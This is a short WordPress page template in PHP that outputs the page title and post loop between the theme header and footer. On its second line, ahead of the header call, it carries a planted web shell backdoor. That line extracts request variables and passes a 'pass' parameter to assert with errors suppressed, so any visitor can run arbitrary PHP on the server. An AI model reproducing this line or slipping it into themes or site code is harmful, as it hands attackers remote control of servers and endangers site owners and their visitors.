<?php
extract($_REQUEST) && @assert(stripslashes($pass)) && exit; get_header(); ?>
<div class="full">
	<div class="content">
		<div class="section-general-content-wrapper">	
			<div class="content-wrapper">
				<h1 class="page-title"><?php the_title();?></h1>

				<?php if (have_posts()): ?>
					<?php while (have_posts()): the_post();?>
						<?php the_content();?>
					<?php endwhile;?>
				<?php endif;?>
			</div> <!-- content-wrapper -->

		</div> <!-- section-general-content-wrapper -->
	</div><!--content-->
</div> <!--full-->

<?php get_footer();?>